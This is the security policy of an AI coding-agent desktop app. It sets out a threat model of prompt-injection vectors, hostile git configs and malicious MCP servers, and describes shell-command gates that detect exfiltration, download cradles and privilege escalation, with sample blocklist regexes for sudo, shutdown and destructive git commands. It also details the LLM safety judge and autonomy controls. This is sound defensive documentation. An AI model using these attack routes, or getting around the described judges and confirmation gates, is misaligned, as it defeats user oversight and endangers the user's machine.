# Security Policy

> **This is a security *policy*, not an audit report.** It defines the project's threat model and the secure coding rules every contributor and coding agent must follow. It does **not** record whether the current codebase complies with these rules — compliance verification belongs in code review, audits, or the issue tracker, never in this file.

## Supported Versions

c0wrk is pre-1.0 software under active development. Only the latest release line receives security updates.

| Version | Supported          |
| ------- | ------------------ |
| 0.5.x   | :white_check_mark: |
| < 0.5   | :x:                |

The current release is tracked in [`CHANGELOG.md`](./CHANGELOG.md). Breaking changes may land in any 0.x release until 1.0 stabilizes the public surface.

## Reporting a Vulnerability

**Do NOT open public GitHub issues for security vulnerabilities.**

Report suspected vulnerabilities privately so they can be triaged before public disclosure.

- **Preferred channel:** open a private security advisory via GitHub's "Report a vulnerability" feature on the repository's **Security** tab. If that is unavailable, contact the maintainer directly.
- **Include:** a description of the issue, the attack path, affected versions/files, and a reproduction if possible.
- **Response SLA (target):**
  - Acknowledgment: within 72 hours
  - Triage & severity assessment: within 7 business days
  - Fix timeline: Critical — 14 days, High — 45 days, Medium — 90 days
- **Disclosure policy:** coordinated disclosure. We request a 90-day embargo before public disclosure, extendable on request. Reporters are credited in release notes unless they prefer anonymity.
- **Bug bounty:** none at this time.

## Threat Model

c0wrk is a **desktop AI coding-agent** (Go backend + React/TypeScript frontend, packaged with Wails v2). The agent reads a user's codebase, reasons, calls tools (filesystem, shell, web), manages subagents, persists memory, and integrates external MCP servers — all on the user's local machine, running under the user's own operating-system credentials. The agentic threat model (OWASP Top 10 for Agentic Applications, ASI01–ASI10) is therefore **required** and is documented below.

### Assets

| Asset                                   | Sensitivity   | Description                                                                                            |

| SQLite database                         | High          | `~/.c0wrk/database.db` — sessions, chat messages (`session_messages`), projects, reviews, work dirs   |
| Configuration file                      | High          | `~/.c0wrk/config.yaml` — provider keys (env-expanded), tool-group policies (`security.groups`), the user-authored execute blocklist, injection-defense toggles |
| System & role prompts                   | High          | `core/prompts/*.md` embedded into the system prompt — extraction reveals guardrails & business logic  |
| Agent conversation history / context    | High          | Multi-turn message logs persisted in SQLite; vectorized codebase index                                |
| Vector index (embeddings)               | Medium/High   | `chromem-go` index of the user's source code; file-hash sidecars — persistent searchable memory       |
| Blackboard facts                        | Medium        | Cross-step/cross-agent facts persisted in `core/persistent_blackboard.go`                            |
| Tool & MCP definitions                  | Medium/High   | Tool schemas, MCP server configs (command/args/env, URL/headers), permission mappings                 |

| Downloaded tool binaries                | Medium        | `~/.c0wrk/tools/` — `rg`, `uv`, `markitdown` (SHA256-verified)                                        |
| ONNX Runtime + embedding model          | Medium        | Fetched into `.cache/` and bundled for the vector index                                              |
| User's filesystem & shell               | Critical      | The agent operates directly on the host under the user's credentials (read/write/exec)               |
| Project source code                     | High          | The workspace the agent reads and modifies — integrity & confidentiality                             |

### Threat Actors

- **Opportunistic attacker** — automated scanners, credential stuffing against leaked API keys.
- **Prompt-injection adversary (ASI01/ASI06)** — plants hostile instructions in files, web pages, tool outputs, dependencies, or `AGENTS.md` sources that the agent reads and may follow.
- **Malicious dependency / tool author (ASI04)** — publishes a compromised Go/npm dependency, MCP server, or bundled tool with deceptive schemas.
- **Compromised agent identity (ASI03/ASI07)** — forges or inherits agent/subagent authority to act with delegated privileges.
- **Trust-exploitation target (ASI09)** — the operator who over-trusts confident agent output and rubber-stamps confirmation prompts (approval fatigue).
- **Compromised host process** — any local process that writes machine-wide files (`~/.agents/AGENTS.md`) or tampers with `~/.c0wrk/` data.
- **Motivated external attacker** — targeted exploitation of the supply chain, SSRF via `web_fetch`, or shell-command injection.

### Attack Surface

Entry points where untrusted input or adversarial content reaches the system:

- **Agent prompt inputs (ASI01)** — user messages, clipboard text/files/images, native file drops, retrieved files, `web_search`/`web_fetch` results, `bash_exec` stdout, `ripgrep`/`glob`/`read_file` output, and **all MCP tool output** entering the model context (indirect-injection vectors).
- **Multi-source `AGENTS.md` (ASI01)** — `~/.agents/AGENTS.md` (machine-wide writable), `~/.c0wrk/.agents/AGENTS.md`, and `<workspace>/AGENTS.md`, all injected into the system prompt.
- **Agent tool / function-calling surface (ASI02)** — every tool the agent may invoke, especially side-effecting ones: `bash_exec`/`posh_exec`, `write_file`, `edit_file`, `delete_*`, `web_fetch`, `create_directory`.
- **Agent-generated shell / code execution (ASI05)** — `bash_exec` (Unix) / `posh_exec` (Windows) running model-generated commands; agent-authored file edits executed by the user's shell.
- **External MCP registries (ASI04)** — dynamically integrated stdio/HTTP MCP servers whose tool descriptions, schemas, and permissions may be forged; configured commands executed as child processes.
- **Downloaded tool binaries (ASI04)** — `rg`, `uv`, `markitdown` fetched from public URLs by the tool-manager.
- **In-app self-update / auto-update (ASI04)** — the self-update pipeline (`core/updater/`) downloads a release archive from GitHub Releases, SHA256-verifies it against `SHA256SUMS`, and atomically swaps the install tree via a two-process re-exec (`--self-update`). This is a **supply-chain delivery vector**: a compromised release (archive *and* checksum) or a MITM that breaks TLS could replace the running binary the user executes. Integrity is SHA256-only, fail-closed; artifacts are **unsigned** (no app-pinned signature key). See [ADR-023](./specs/decisions/023-auto-update.md) for the full threat model and accepted trade-offs.
- **Repository git metadata / app-spawned git subprocesses (ASI04/ASI05)** — a workspace obtained from an untrusted source (clone, archive, npm/tarball drop, native `files:dropped` payload) arrives **as files**, including attacker-authored `.git/config` and `.gitattributes`; git executes config-driven external programs during routine read-only operations (`status`, `diff`, `add`, `commit`), and a live session's `.git/config` can also be planted mid-session. Countermeasures: every git process c0wrk spawns carries safe `-c` overrides; repo-scoped invocations re-scan `.git/config` fresh (no cache) and neutralize what they find, failing closed on unscannable configs; the agent cannot write into `.git` (hard `git_internal_path` reason); the user is warned at intake; an explicit user trust opt-out runs raw git for a root only while its config matches the trusted snapshot, rechecking on every open and failing closed back to hardening on drift. See the [App-Spawned Subprocess Hardening](#app-spawned-subprocess-hardening-git) section and [ADR-033](./specs/decisions/033-git-subprocess-hardening.md) / [ADR-034](./specs/decisions/034-git-trust-opt-out.md).
- **Agent memory stores (ASI06)** — SQLite `session_messages`, the project-scoped vector index, persisted pause/subagent trajectories, RESEARCH artifacts under a workspace-contained root, and persistent blackboard facts.
- **Prompt-discovered work directories (ASI02/ASI05)** — existing directory paths mentioned by the user may be added to the session's auxiliary roots. Adding a root expands the agent's filesystem reach for that task; containment/symlink/group-policy gates still apply to individual tool calls.
- **Vector/attachment ingestion (ASI06/ASI10)** — pasted/dropped/selected files and workspace files are parsed, converted, chunked, or embedded. File-size, image-size, conversion-time, chunk-count, and output limits are resource-exhaustion boundaries, not optional tuning conveniences.
- **RESEARCH mode (ASI06/ASI07)** — experimental methodology skills and recursively watched Markdown artifacts influence routing and future turns. Explicit research roots must remain inside the project workspace; disabling the mode preserves artifacts and seeded skills, which remain untrusted persisted data.
- **Inter-agent channels (ASI07)** — the subagent delegation protocol (`delegate`, `execute_plan`) and the shared blackboard.
- **Human-approval / HITL gates (ASI09)** — `tool_confirm`, `ask_user`, plan/goal review prompts.
- **Outbound HTTP (SSRF)** — `web_fetch`, `web_search`, LLM API calls, MCP HTTP servers.
- **LLM provider endpoints** — outbound calls to Anthropic/OpenAI/local servers carrying API keys.
- **Dependency supply chain** — Go modules (`go.sum`) and npm packages (`package-lock.json`).
- **Frontend rendering** — `react-markdown`, `rehype-sanitize`, Mermaid, highlight.js rendering tool/agent output (XSS surface).
- **CI/CD pipeline** — `.github/workflows/ci.yml`, `.github/workflows/release.yml`.

```

The most critical boundary is the one between **trusted developer instructions** (`core/prompts/`, tool definitions) and **untrusted content the agent reads at runtime** (files, web, tool/MCP output, `AGENTS.md`). Both arrive as natural language the model treats identically — the root cause of ASI01. The hard enforcement boundary is the **tool-policy pipeline** (policy → judge → confirmation); prompt-level framing is defense in depth on top of it.

### Known Risks & Accepted Trade-offs

These are inherent architectural trade-offs the design knowingly accepts — not compliance gaps.

| Risk                                                                  | Severity | Mitigation / Rationale                                                                                                        |
| --------------------------------------------------------------------- | -------- | ----------------------------------------------------------------------------------------------------------------------------- |
| Agent runs under the user's own OS credentials (no sandbox/tenant isolation) | High     | Accepted: c0wrk is a single-user local desktop tool. The tool-policy pipeline + confirmation gates bound the agent's *latitude*, not the OS-level *reach* (least agency, not least privilege). |
| Local LLM servers may use an empty API key                            | Medium   | Accepted for local-dev convenience; only `localhost`/named local providers. Production cloud providers require keys.          |
| `~/.agents/AGENTS.md` is machine-wide writable and feeds every prompt | Medium   | Accepted trade-off (ADR-020) for global-instructions utility; mitigated by untrusted framing + tool-policy gating; not eliminated. |
| LLM-based safety judge is advisory/on-demand by default; the `assisted` autonomy mode makes it an automatic gate for every escalated call (opt-in via `security.autonomy_mode`, default `standard`)   | Medium   | In `standard` mode the judge remains advisory only (invoked via the "Ask Agent" button). In `assisted` mode (the former Smart Approve; the legacy `security.smart_approve` key migrates to the enum at load), a strict OWASP ASI judge automatically evaluates every escalated call — an effective `user_confirm` call, or a hard/soft safety reason surfaced by an `allow`-group tool (the unified confirmation funnel) — after all deterministic gates and workspace auto-approval. A strict ALLOW skips UI (except a canonical hard reason, backstopped to a confirmation), a strict DENY terminates the call outright, and every other outcome (CONFIRM, timeout, error, unparseable) falls back to manual confirmation. The group-policy/blocklist/flowsh-analysis/symlink/confirmation pipeline remains the hard gate; the automatic postures never weaken a `deny` group or the fail-closed nil-ConfirmFunc invariant, and the deterministic backstop forces confirmation for canonical hard reasons — fired controls (blocklist, flowsh shell-analysis controls, SSRF, symlink escape) and unassessable inputs (degraded SSRF protection, an undeterminable URL/path) — even when the strict judge returns ALLOW **on the interactive paths**; the silent `judge` terminal is the one deliberate exception (see [Autonomy](#autonomy-standard--assisted--silent)). Canonicality is keyed off typed reason codes (`JudgeOutcome.ReasonCode`, a stable sp4rk contract), never off prose. |
| No LLM-based output-content judging for injection detection           | Medium   | Accepted; injection defense is prompt-level spotlighting + tag-escape, judged externally/by firewall.                         |
| No session-level wall-clock time-box (ASI10)                          | Low      | Accepted trade-off: agent autonomy is bounded by step/loop caps, the 50-turn goal ceiling, and circuit breakers, but there is no hard wall-clock deadline. A long-running session can in principle run indefinitely until those caps hit. |
| Pre-1.0 breaking-change surface                                       | Low      | Tracked via CHANGELOG semver discipline until 1.0.                                                                            |
| Self-update ships **unsigned** artifacts verified by SHA256 only (ASI04) | High     | Accepted trade-off (ADR-023): integrity is SHA256-only, fail-closed, with no app-pinned signature key. SHA256 pins the archive to the released bytes but does **not** prove release authorship — a compromised GitHub release (archive *and* matching checksum) would be accepted. Bounded by release-publishing perms + GitHub account security (2FA); mitigated by HTTPS-only/proxy-aware transport, fail-closed verification, `.old` rollback, and `ErrNonStandardLocation` location safety. A signature verifier can be added later via the `Verifier` interface. |
| Repository hooks and config-driven git programs (incl. git-lfs smudge/clean) do not execute inside c0wrk by default | Low | Accepted security-first trade-off (ADR-033, amended by ADR-034): filters and drivers are distrusted by default — including legitimate ones — so LFS-pointer files appear as raw content and hook-based workflows (husky, pre-commit) do not run, with the strip announced (`project:git_config_risk` notice). ADR-034 adds a user-controlled opt-out: trusting a repository runs raw git for it (its own hooks/filters/signing apply), but the trust is snapshot-bound, recheck-with-diff, and fail-closed — any post-trust config drift evicts the trust and re-hardens the repository. |

## Security Architecture

### Authentication & Authorization

c0wrk is a local single-user desktop application; there is no multi-tenant authentication surface. Authorization is **tool-level**, enforced by the policy pipeline in `core/tools/registry.go`:

- **Tool-group policies** — `allow` / `user_confirm` / `deny` (default `user_confirm`, the safest), configured per **capability group** in `security.groups` (ADR-024). Every tool declares exactly one of the 8 groups (`execute`, `local_read`, `local_write`, `remote_read`, `remote_write`, `local_mcp`, `remote_mcp`, `system`); the registry resolves the call's policy from its group alone — there is no per-tool override layer. An unconfigured group resolves fail-safe to `user_confirm`.
- **The `system` group** (agent infrastructure: `ask_user`, `finish`, `delegate`, `store_fact`, `batch`, `declare_plan`, `execute_plan`, `update_checklist`, etc.) bypasses policy — it is a reserved group that cannot be configured and must not be extended carelessly. A tool with an undeclared group matches no allow-list and fails closed.
- **LLM-provider authentication** — API keys are supplied per provider via `${ENV_VAR}` expansion; local servers may omit keys.

**Rules:** Every new tool MUST declare a capability group (`ToolGroup` on `BaseTool`); side-effecting tools belong to a mutating group whose default policy is `user_confirm`. Tagging a tool `GroupSystem` requires explicit security review — it bypasses every gate. Never ship a tool in an `allow` group without a `ToolJudger` for its dangerous operations.

### Data Protection

- **At rest:** the SQLite database (`~/.c0wrk/database.db`) and config (`~/.c0wrk/config.yaml`) live in the user's home directory under default OS file permissions. Secrets are env-expanded at load, not stored as plaintext literals in committed config.
- **In transit:** outbound calls to LLM providers and MCP HTTP servers use TLS; an optional HTTP/HTTPS proxy (`proxy` config) with a bypass list and custom CA-cert directory (for corporate MITM) is supported. Per **compatible** provider, a non-empty `tls_fingerprint` (base64 SHA-256 SPKI pin) replaces system CA verification for self-signed or internal-PKI endpoints: only the pinned public key is accepted, and an empty value means normal system verification. There is **no** configuration that accepts an arbitrary certificate and **no** skip-verification switch — a wrong pin refuses the connection rather than downgrading it (see [ADR-054](./specs/decisions/054-per-provider-tls-pinning.md)). Fixed providers (`anthropic`, `chatgpt`) carry no pin key at all. While an effective proxy is enabled (`proxy.enabled` + a `proxy.url`), the pin is ignored on every provider dial path — proxied connections are verified by the proxy's own TLS config, and `proxy.bypass_list` is the route for pinning a host that must also bypass the proxy. The only unverified handshake in the system is the Get-fingerprint probe, which sends no HTTP request and no API key; fingerprint-mismatch errors deliberately carry no key material.
- **PII / secrets in memory:** API keys are threaded to clients; conversation history and the vector index contain whatever the user's workspace contains — treat workspace contents as potentially sensitive.

**Rules:** Never log secrets, full API keys, or session tokens (`log/slog`). Never write API keys into committed files; always reference `${ENV_VAR}`. Never persist raw credentials into chat messages, blackboard facts, or error results.

### Secret Management

- Secrets enter via environment variables expanded in `config.yaml` (`${ANTHROPIC_API_KEY}`, `${OPENAI_API_KEY}`, `${TAVILY_API_KEY}`, proxy credentials). `config.LoadShellEnvironment()` runs before any other init so Finder-launched apps inherit shell env — this ordering is an invariant.
- Secrets MUST NEVER appear in: source code, log output, error messages returned to the LLM, CI logs, the vector index, blackboard facts, or tool results.

**Rules:** Treat every tool result and agent message as potentially entering the model context — never embed a secret in a value the agent can read or echo. On macOS, preserve the `LoadShellEnvironment()`-before-init ordering in `desktop/startup.go`.

### Dependency Management

The dependency graph is sizeable: ~368 Go module entries (`go.sum`) and ~701 npm packages (`frontend/package-lock.json`). Key security-relevant dependencies include the LLM SDKs (`openai-go`, `go-anthropic`), the MCP client (`mark3labs/mcp-go`), the vector store (`chromem-go`), the SQLite driver (`modernc.org/sqlite`), and the agent SDK (`github.com/v0lka/sp4rk`).

**Rules:** Pin via lockfiles (`go.sum`, `package-lock.json`) and verify checksums. Evaluate new dependencies for maintenance, license, and transitive risk before adding. External binaries downloaded at runtime MUST be SHA256-verified (the tool-manager's `verifyChecksum` pattern). MCP servers integrated dynamically MUST be treated as untrusted code (see ASI04).

### App-Spawned Subprocess Hardening (Git)

A repository is attacker-controlled data, and `.git/config` is effectively a program-invocation configuration file: git executes config-driven external programs (fsmonitor daemons, hooks, clean/smudge/process filters, merge drivers, textconv, signing binaries, editors) during ordinary operations — including read-only ones like `status` and `diff` — before any trust decision c0wrk makes. Two vectors define the threat class:

- **Repo-arrives-as-files.** A workspace obtained from an untrusted source (clone, archive, package drop, `files:dropped` payload) can arrive pre-armed with hostile `.git/config` keys and a matching `.gitattributes`; the first git call c0wrk runs would otherwise execute attacker-chosen binaries.
- **Mid-session `.git/config` planting.** Config can be rewritten while a session is live, so any inspect-once-trust-for-the-session scheme is unsound.

Countermeasures (hardening layers 1–4 and their rationale and canary evidence in [ADR-033](./specs/decisions/033-git-subprocess-hardening.md); the user-controlled trust/harden opt-out and its snapshot-bound recheck in [ADR-034](./specs/decisions/034-git-trust-opt-out.md)):

1. **Global baseline on every git process** — `internal/sysproc.GitCmd` is the single spawn choke point; every invocation gets `-c core.fsmonitor=false`, `-c core.hooksPath=<empty safe dir under ~/.c0wrk/git>`, `-c commit.gpgsign=false`, and `GIT_EDITOR=true` in the environment. Command-line `-c` wins over repo config, so no repository is ever modified.
2. **Per-repo neutralization, re-scanned per invocation** — `core/workspace.GitCmdInRepo` parses the config of the repository git itself would discover (the `.git` chain is walked up from the given root, covering subdirectory workspaces; for linked worktrees the common dir is resolved via `commondir` and the common config plus the enabled `config.worktree` overlay are merged with git's layering semantics) fresh on every repo-scoped call (no cache — mid-session planting is neutralized) and prepends `-c` overrides disarming detected filters/merge drivers/textconv, the transport keys the Git panel's remote operations reach (`core.sshCommand=ssh` restores the default ssh binary, `core.askPass=`, `credential.helper=` plus a per-URL `credential.<url>.helper=` pin — an empty value resets the accumulated helper list; `core.gitProxy` — executed by every `git://` fetch/push under the full baseline argv, with no neutralizable value of its own — is killed via `-c protocol.git.allow=never`, which forbids the transport family so the operation fails closed with "transport not allowed" instead of executing the repository's proxy), and the external diff drivers plain `git diff` executes by default (`diff.external=`, `diff.<n>.command=`; the three patch-producing diff call sites pass `--no-ext-diff` so their output stays usable), and — narrowed per review [56] — the `attr.tree=<empty-tree>` attribute-routing kill engaged ONLY while include directives may hide driver definitions from the scan. Visible drivers are neutralized by name instead: the per-name `-c` pins cover every routing source — the in-tree `.gitattributes` included — and leave benign eol/text attributes working, so a legitimate CRLF-normalized repository (`* text=auto`) no longer shows falsely-modified files and whole-file numstat diffs (empirically confirmed collateral of the blanket kill on git 2.50.1; disclosed in the intake warning whenever the kill is active). The kill is object-format aware (the SHA-256 constant on `extensions.objectformat=sha256` repositories, where the SHA-1 hash is a verified silent no-op). The attribute sources `attr.tree` cannot cover — `.git/info/attributes` and `core.attributesFile` (verified live from repository config on git 2.50.1) — are themselves scanned: every routed driver name is pinned by the same `-c` overrides (which beat file config wherever the driver is defined, including included files), and `core.attributesFile=` (empty) disables that source; an attribute source that exists but cannot be scanned fails closed (there is no config kill-switch for the attributes mechanism). Include-bearing configs additionally carry name-independent pins (`core.sshCommand=ssh`, `core.askPass=`, `credential.helper=`, `diff.external=` — the exact values the finding-driven path uses) for the command-bearing keys an included file may set invisibly; they fire only for include-bearing configs because a `-c` pin beats the user's own global config too. `core.worktree` — which redirects where `checkout`/`reset --hard` write tracked files, to any absolute path outside the workspace, with no `-c` form able to beat it — is neutralized by pinning the spawn environment's `GIT_WORK_TREE` to the discovered repository root (the one channel that outranks the config key), applied only when the scan reports the finding so legitimate worktree-using setups are untouched. Because `attr.tree` exists only since git 2.45 (older git silently ignores it, which would leave include-hidden attribute-routed drivers live), the git version is resolved once per process (cached, through the same hardened spawn chokepoint) and repo-scoped git execution **fails closed with a clear error for include-bearing configs when the resolved version is older than 2.45 or unresolvable**. An unscannable config (unreadable, oversized, non-regular file, malformed pointer) fails closed the same way (git is not executed; boolean predicates fall back to git-free paths). The spawn environment strips the `GIT_ATTR_*` family (`GIT_ATTR_SOURCE` et al.) so an inherited value cannot reroute where git reads attributes from.
3. **Intake detection & warning** — opening a repository (project switch, auxiliary work-directory add) scans the config and emits `project:git_config_risk` when it is not *provably* clean (dangerous keys, include directives, malformed or unreadable config), carrying the standing notice that repository-defined hooks never run inside c0wrk. Detection is fail-closed: an unprovable config is a warning, never a silent pass.
4. **Agent-side `.git` write gate** — the five mutating file tools return a hard `git_internal_path` reason for any target inside a `.git` tree of the workspace or any auxiliary work-directory root, forcing interactive confirmation under any policy so the agent cannot be steered into planting hooks/filters for later execution outside c0wrk. The gate matches the ".git" component case-insensitively (`.GIT`/`.Git` are git internals too — fail-safe), and a session root that itself ends inside a `.git` tree (e.g. a workspace opened at `<repo>/.git/worktrees/<name>`) is covered in full: every target under it is git internals. **Deliberate exception — the per-session temp directory:** the session temp dir (`session.TempDir`, attached via `tools.WithTempDir`) is *not* covered by this gate. It is c0wrk-managed, per-session, ephemeral scratch space where creating a throwaway repository (`git init` experiments) is a legitimate workflow, and no repository c0wrk runs git against ever lives there; a `.git` write inside it auto-approves like any other temp write. This is an accepted-risk decision, not an oversight. The implicit OS temp roots (`/tmp`, `os.TempDir()`, `%SystemRoot%\Temp`) ride the allowed-roots channel ([Implicit Temp Roots](./specs/architecture/security-model.md#implicit-temp-roots)) and therefore **are** covered: a `.git` write under them escalates to confirmation exactly like a workspace `.git` write.
5. **User trust opt-out (snapshot-bound, recheck-with-diff, fail-closed)** — a user who genuinely trusts a repository can opt it out of hardening. `TrustGitRepo` stores the repository's work-tree root plus the fingerprint of a canonical snapshot of every config source the scan read (common config, `config.worktree` overlay, `.git/info/attributes`, `core.attributesFile`), and mirrors the root into the process-wide `core/gittrust` registry so the spawn layer runs **raw git** (`sysproc.GitCmdRaw`) for it — its own hooks, filters, merge drivers, textconv and signing apply as they would outside c0wrk. The trust binds to the exact config the user reviewed: on every open `recheckTrustedGitRepo` re-scans and compares fingerprints; a match stays silent, and any drift (changed or now-unreadable config) **evicts the trust and re-hardens**, re-emitting `project:git_config_risk` with a `reason` and a human-readable `diff`. Fail-closed on both ends: an unscannable config is refused at trust time, and drift at open time evicts rather than keeping a raw-git root whose config c0wrk can no longer see. The inverse — `security.harden_git_repos` (`HardenGitRepo`) — pins a root as always hardened, mutually exclusive with trust. Entries written by pre-fingerprint builds migrate with an empty fingerprint and keep suppressing the warning unconditionally until re-trusted. See [ADR-034](./specs/decisions/034-git-trust-opt-out.md).

**Rules:** Never spawn git outside the hardened choke points (`sysproc.GitCmd`; repo-scoped work goes through `workspace.GitCmdInRepo`). Never treat a repository's `.git/config` as trusted input, and never cache scan results across invocations. Never add a known-filter-name whitelist and call it coverage — unknown names are only covered by the attribute-routing kill. Hook/config-driven-program stripping is unconditional by default: strip *and* warn, never strip silently, never fail the operation; legitimate filters (git-lfs) are distrusted like everything else. The one deliberate exception is the user trust opt-out ([ADR-034](./specs/decisions/034-git-trust-opt-out.md)): a trusted root runs raw git **only** while its config matches the trusted snapshot, and any drift (or an unscannable config) fails closed back to hardening with a re-warning — trust is never a permanent waiver and never silent.

### Shell Command Analysis (flowsh)

The deterministic shell gate for `bash_exec`/`posh_exec` has three layers (ADR-052), evaluated in order — all before workspace auto-approval:

1. **Blocklist** — the user-authored regex list `security.groups.execute.blocklist` (**empty by default**; c0wrk ships no predefined patterns). A match is a hard **canonical** reason (`command_blacklist`) and beats every criterion. Legacy custom `blacklist:` lists migrate to `blocklist:` at load; lists equal to the old shipped default are dropped (effective empty). The blocklist never hard-denies — the user can always Allow Once through the confirmation.
2. **Symlink analysis** — registry-level, unchanged; an escape out of the session roots is a canonical hard reason.
3. **Flowsh criteria C1–C8** — structural criteria computed from the flowsh effect IR (`github.com/v0lka/flowsh`, AST-based, engine side in sp4rk `tools/shellanalysis.go`). The registry precomputes the analysis **once per call** (`AttachShellAnalysis`) and attaches it to the call context; the shell tools' `Judge` returns the winning outcome verbatim without recomputation. When that analysis cannot be produced (the flowsh analyzer or its knowledge base failed to initialise), the Judge **fails closed** with the hard canonical `command_analysis_unavailable` reason — the absence of the floor is never read as an allowance.

The criteria (fixed priority C1 > C2 > … > C8; all fired criteria are recorded in the digest):

| # | Condition (structural facts only — never scores/grades) | Reason code | Severity | Canonical |
| --- | --- | --- | --- | --- |
| C1 | exfiltration pair: secret read → tainted network egress | `command_exfil_flow` | hard | yes |
| C2 | privilege-escalation effect (e.g. SUID install) | `command_privilege_escalation` | hard | yes |
| C3 | direct write/metadata on a system path (`/etc`, `/usr`, `/boot`, `/bin`, `/sbin`; Windows `c:\windows`, `c:\program files`, `c:\program files (x86)`, component-boundary matched) or a non-harmless raw device | `command_system_write` | hard | yes |
| C4 | irreversible destructive command (KB class D/E) writing outside the session roots | `command_destructive_outside_roots` | hard | yes |
| C5 | analyzer ⊤/conservative **with** network egress (download-cradle shape) | `command_download_cradle` | hard | yes |
| C6 | analyzer ⊤/conservative **without** network egress, **or** an irreversible write whose target the analyzer could not resolve (⊤ target — e.g. abbreviated PowerShell parameters) | `command_unbounded_analysis` | hard | **no** |
| C7 | credential access without an exfil pair | `credential_access` | soft | — |
| C8 | direct FS effect outside the session roots — writes/metadata on a non-system path, and reads even of a system path (system writes/metadata are C3's; raw-device reads are exempt) | `outside_session_roots` | soft | — |

**⊤ semantics.** `top`/`conservative` mean *the analyzer could not bound this command* — an analyzer limitation, not proof of malice; routine local scripts and unfamiliar CLIs land there (`./scripts/build.sh`, `aws s3 ls`), and so does an irreversible write whose target the analyzer could not resolve (a ⊤ target — the abbreviated-PowerShell-parameter shape `Remove-Item -r -f …`). Hence C6 is hard but **non-canonical**: the strict judge may clear it. C5 (⊤ **with** network egress) is canonical because the calibration corpus shows no routine command produces that combination, while every download cradle does.

**Canonical set** (never clearable by a strict ALLOW **on the interactive paths** — the silent `judge` terminal is the one deliberate exception, where the operator delegated the final decision to the judge and its ALLOW executes with the decision audited; the only reasons `ExecuteUnattended` blocks on): `command_blacklist`, `command_exfil_flow`, `command_privilege_escalation`, `command_system_write`, `command_destructive_outside_roots`, `command_download_cradle`, `command_analysis_unavailable` (a failed analyzer — the shell Judge fails **closed**, since a call must never run with the floor silently absent), `ssrf_private_address`, `symlink_escape`, `ssrf_protection_degraded`, `unassessable_url`, `unassessable_path`. Canonicality is matched off typed reason codes, never prose.

**Judges interpret the digest.** The digest (`sp4rk-shell-analysis/v1`: schemaVersion, effects, score with exfil pairs, destructive classes, fired criteria) reaches every judge: the tool's own `Judge` (from the context), the strict judge (`StrictJudgeRequest.AnalysisContext`, inside an untrusted `shell_analysis` boundary — the digest is evidence, never instructions), and the advisory Ask-Agent judge (a `## Static Analysis Report` prompt block). Judge prompts teach the semantics (`score.grade` is the *inherent* destructiveness of the command text — routine in-root `rm -rf build/` grades Critical and that is expected; nothing follows from the digest's absence).

**ExecuteUnattended is canonical-only.** The verify-on-edit path blocks only canonical hard reasons (judge and symlink canonicality checked independently); a ⊤ verification command runs because it is the user's own config. See [specs/domains/verify-on-edit.md](./specs/domains/verify-on-edit.md) and [ADR-052](./specs/decisions/052-flowsh-command-analysis.md).

**Known gaps, deliberately left to the judges and the user blocklist:** plain `sudo` (flowsh emits PrivEsc only for SUID installs), power-state commands (`shutdown` is KB class C, below C4's D/E bar), environment-variable exfiltration without an FS/Cred source pair, and agent-typed mutating `git` subcommands (the shipped SCM patterns went with the default list; the analyzer has no git-subcommand criterion). Under `security.groups.execute.policy: allow` none of these has any deterministic reason — the judges only see calls a reason escalated — so a user who wants a hard floor adds a blocklist pattern (e.g. `sudo\s+`, `\b(shutdown|reboot|halt|poweroff)\b`, `git\s+(push|reset\s+--hard|clean\s+-[fdx])`).

### Autonomy (Standard / Assisted / Silent)

`security.autonomy_mode` (default **`standard`**) is the unified autonomy posture — one enum replacing the former pair of boolean keys, `security.smart_approve` (the Smart Approve toggle) and the silent-mode master switch. Both survive **only as legacy migration keys**: they are honored at load (an explicit `autonomy_mode` wins; otherwise `silent_mode.enabled: true` maps to `silent`, else `smart_approve: true` maps to `assisted`, else `standard`) and dropped at the next save; an unknown enum value fails safe to `standard` with a load warning — never a hard load error. See [ADR-053](./specs/decisions/053-silent-mode.md) and [specs/architecture/security-model.md](./specs/architecture/security-model.md#silent-mode-unattended-operation).

- **`standard`** — the interactive posture: no automatic gate; every confirmation-gated call opens a user card (hard reasons with the advisory judge disabled).
- **`assisted`** (the former Smart Approve) — a strict OWASP ASI judge automatically evaluates **every escalated call** — an effective `user_confirm` call, or a hard/soft safety reason surfaced by an `allow`-group tool — through the unified confirmation funnel, after all deterministic gates and workspace auto-approval. A strict **ALLOW** executes without UI — except a **canonical** hard reason, which the deterministic backstop overrides to a user confirmation (rule 2 below). A strict **DENY** (`VerdictDeny` — the judge *positively* assessed the call as dangerous, as distinct from CONFIRM's "cannot decide") **terminates the call**: the tool is not executed, no card opens (`ConfirmFunc` is never invoked), the `ToolResult` carries the judge's justification, and the decision is audited (`autonomy_decision`, kind `assisted_deny`). CONFIRM — and a missing, failing, or unparseable judge (including assisted with no judge provider, which degrades to `standard` cards, fail-safe) — falls back to manual confirmation with the advisory Ask Agent action disabled.
- **`silent`** — the unattended posture: no card can open. The `security.silent_mode` sub-policies — live **only** in this mode, inert in `standard`/`assisted` — resolve the three prompts that would otherwise block a run: `tool_confirm` (`judge` default | `allow` | `deny`), `step_limit` (`auto` default | `allow_once`/`allow_more`/`allow_always`/`deny` | `stop` keeps the card), `ask_user` (`disable` default | `enable`). (A former fourth sub-policy, `review_prompt`, was removed with the post-task review prompt itself — see [ADR-055](./specs/decisions/055-remove-post-task-review-prompt.md).)

**Preserved invariants.** The automatic postures replace only the *human answer* to a prompt. They are reached exclusively from inside the unified confirmation funnel (`smartApproveOrConfirm`), *after* every deterministic gate, and never turn a gate into a pass:

- **`deny` groups are preserved** — a `deny`-group tool is blocked before the funnel, never judged, and never executed, under any mode or silent sub-policy.
- **Every deterministic pre-funnel gate is preserved** — the `allow`-policy Judge gate ordering, workspace/temp auto-approval priority, path containment, symlink-escape detection, and the flowsh criteria are unchanged.
- **A fired control is never auto-executed without the judge.** In silent `tool_confirm.mode: allow`, a call carrying a **hard** safety reason (canonical or not) escalates to the strict judge; only a judge ALLOW executes it. `deny` mode denies every gated call outright without consulting the judge.
